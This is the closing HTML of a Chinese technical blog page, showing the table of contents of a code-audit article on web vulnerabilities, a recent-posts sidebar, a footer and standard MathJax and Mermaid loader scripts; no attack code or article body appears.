toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B1%87%E7%82%B9%E6%89%AB%E6%8F%8F%E5%BE%88%E5%B9%B2%E5%87%80%EF%BC%8C%E4%BD%86%E8%BF%99%E4%B8%8D%E7%AE%97%E5%A5%BD%E6%B6%88%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">二、汇点扫描很干净，但这不算好消息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%9B%AF%E4%BD%8F%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E6%B5%81%E5%90%91%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E9%82%A3%E4%B8%80%E5%A4%84"><span class="toc-number">3.</span> <span class="toc-text">三、盯住用户输入流向文件系统的那一处</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%9A%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E7%9A%84%E5%B1%82%E7%BA%A7%E8%A6%81%E6%95%B0%E6%B8%85%E6%A5%9A"><span class="toc-number">4.</span> <span class="toc-text">四、任意文件读取：路径穿越的层级要数清楚</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E4%B8%8A%E4%BC%A0%E6%8E%A5%E5%8F%A3%EF%BC%9A%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">5.</span> <span class="toc-text">五、上传接口：从任意文件上传到命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%EF%BC%9A%E5%AE%89%E8%A3%85%E5%99%A8%E8%87%AA%E5%B7%B1%E6%8A%8A%E5%AF%86%E7%A0%81%E5%91%8A%E8%AF%89%E4%BD%A0%E4%BA%86"><span class="toc-number">6.</span> <span class="toc-text">六、默认口令：安装器自己把密码告诉你了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%9A%E4%B8%80%E8%A1%8C%E5%8E%9F%E6%A0%B7%E8%BE%93%E5%87%BA"><span class="toc-number">7.</span> <span class="toc-text">七、存储型 XSS：一行原样输出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%E6%B3%84%E6%BC%8F-SQL-%E8%AF%AD%E5%8F%A5%E4%B8%8E%E8%B0%83%E7%94%A8%E6%A0%88"><span class="toc-number">8.</span> <span class="toc-text">八、未授权接口泄漏 SQL 语句与调用栈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E8%BF%98%E6%9C%89%E4%B8%A4%E4%B8%AA%E8%AE%BE%E8%AE%A1%E9%97%AE%E9%A2%98"><span class="toc-number">9.</span> <span class="toc-text">九、还有两个设计问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E8%BF%99%E6%AC%A1%E5%AE%A1%E8%AE%A1%E7%9A%84%E5%87%A0%E7%82%B9%E5%BD%92%E7%BA%B3"><span class="toc-number">10.</span> <span class="toc-text">十、这次审计的几点归纳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">11.</span> <span class="toc-text">十一、修复建议</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/a1b2/" title="对 Dataman 的代码审计分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figDM4_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="对 Dataman 的代码审计分析"></a><div class="content"><a class="title" href="/posts/a1b2/" title="对 Dataman 的代码审计分析">对 Dataman 的代码审计分析</a><time datetime="2026-10-16T13:00:00.000Z" title="发表于 2026-10-16 21:00:00">2026-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4d7b/" title="同一个像素数，为什么小 CMOS 拍不清晰：单像素面积、衍射极限与通光孔径"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figC1_%E5%8D%95%E5%83%8F%E7%B4%A0%E9%9D%A2%E7%A7%AF.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="同一个像素数，为什么小 CMOS 拍不清晰：单像素面积、衍射极限与通光孔径"></a><div class="content"><a class="title" href="/posts/4d7b/" title="同一个像素数，为什么小 CMOS 拍不清晰：单像素面积、衍射极限与通光孔径">同一个像素数，为什么小 CMOS 拍不清晰：单像素面积、衍射极限与通光孔径</a><time datetime="2026-10-16T12:00:00.000Z" title="发表于 2026-10-16 20:00:00">2026-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4c9e/" title="异步环境下的条件竞争：为什么单线程的协程也会有并发问题"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figA1_await%E6%98%AF%E6%8A%A2%E5%8D%A0%E7%82%B9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="异步环境下的条件竞争：为什么单线程的协程也会有并发问题"></a><div class="content"><a class="title" href="/posts/4c9e/" title="异步环境下的条件竞争：为什么单线程的协程也会有并发问题">异步环境下的条件竞争：为什么单线程的协程也会有并发问题</a><time datetime="2026-10-16T12:00:00.000Z" title="发表于 2026-10-16 20:00:00">2026-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7f3a/" title="高并发 API 服务的瓶颈究竟在哪里：连接池、线程池、事件循环与背压"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figC1_%E8%AF%B7%E6%B1%82%E8%B7%AF%E5%BE%84%E4%B8%8E%E7%AD%89%E5%BE%85%E7%82%B9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="高并发 API 服务的瓶颈究竟在哪里：连接池、线程池、事件循环与背压"></a><div class="content"><a class="title" href="/posts/7f3a/" title="高并发 API 服务的瓶颈究竟在哪里：连接池、线程池、事件循环与背压">高并发 API 服务的瓶颈究竟在哪里：连接池、线程池、事件循环与背压</a><time datetime="2026-10-16T02:00:00.000Z" title="发表于 2026-10-16 10:00:00">2026-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5b21/" title="一次 read() 调用究竟经历了什么？从系统调用追踪 Linux 文件读取路径"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/attachments/figR1_%E6%95%B0%E6%8D%AE%E8%B7%AF%E5%BE%84.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一次 read() 调用究竟经历了什么？从系统调用追踪 Linux 文件读取路径"></a><div class="content"><a class="title" href="/posts/5b21/" title="一次 read() 调用究竟经历了什么？从系统调用追踪 Linux 文件读取路径">一次 read() 调用究竟经历了什么？从系统调用追踪 Linux 文件读取路径</a><time datetime="2026-10-15T13:00:00.000Z" title="发表于 2026-10-15 21:00:00">2026-10-15</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©&nbsp;2020 - 2026 By 末心</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div><div class="footer_custom_text"><p>学如逆水行舟，不进则退。</p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.0.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.0/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.1"></script></div></div></body></html>
